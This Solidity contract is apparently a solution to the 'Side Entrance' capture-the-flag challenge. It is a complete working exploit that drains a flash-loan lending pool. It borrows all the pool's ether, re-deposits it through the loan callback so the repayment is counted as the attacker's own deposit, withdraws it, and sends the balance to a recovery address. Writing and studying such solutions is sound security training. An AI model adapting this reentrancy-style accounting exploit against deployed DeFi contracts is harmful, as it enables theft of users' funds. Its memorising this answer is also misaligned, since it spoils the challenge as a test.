pragma solidity =0.8.25;

import {IFlashLoanEtherReceiver, SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceAttacker is IFlashLoanEtherReceiver {
    uint256 constant ETHER_IN_POOL = 1000e18;
    address private pool;
    address private recovery;

    constructor(address _pool, address _recovery) {
        pool = _pool;
        recovery = _recovery;
    }

    receive() external payable {}

    function attack() external {
        SideEntranceLenderPool(pool).flashLoan(ETHER_IN_POOL);
        SideEntranceLenderPool(pool).withdraw();
        (bool success, ) = recovery.call{value: address(this).balance}("");
        require(success, "The attack failed");
    }

    function execute() external payable {
        // the msg.sender will be the pool
        // msg.value will be the ETHER_IN_POOL
        SideEntranceLenderPool(pool).deposit{value: msg.value}();
    }
}
